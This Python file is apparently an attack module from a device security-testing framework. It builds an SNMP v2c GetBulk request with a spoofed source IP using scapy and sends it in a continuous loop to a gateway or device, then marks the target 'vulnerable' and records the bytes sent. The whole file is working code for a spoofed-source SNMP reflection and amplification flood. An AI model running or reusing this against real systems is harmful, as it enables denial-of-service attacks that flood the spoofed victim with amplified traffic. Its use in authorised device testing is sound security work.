
from generic_attack import *
import logging
log = logging.getLogger(__name__)
from scapy.all import *
class SnmpRemote50(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(SnmpRemote50, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):

        target = self.config['gateway_ip']
        deviceMac = self.device['macAddress']
        self.running = True
	deviceMode = self.config['deviceMode']
	if deviceMode:
            target=self.device['ip']
        serverIp = self.config['server_ip']
        destinationPort = self.config[deviceMac]
        packetCount = 0

        spoofed_packet = IP(src=serverIp, dst=target) / UDP(sport=80, dport=destinationPort) / SNMP(version="v2c", community='public',PDU=SNMPbulk(id=RandNum(1, 200000000),max_repetitions=10,varbindlist=[SNMPvarbind(oid=ASN1_OID('1'))]))

        while self.running:
            send(spoofed_packet)
            time.sleep(0.02)
            packetCount+=1

        dataTransfered = packetCount * len(spoofed_packet)

        result.update({"status": "vulnerable", "dataTransmitted": dataTransfered, "device": deviceMac})
        return

    def shutdown(self):
        self.running = False

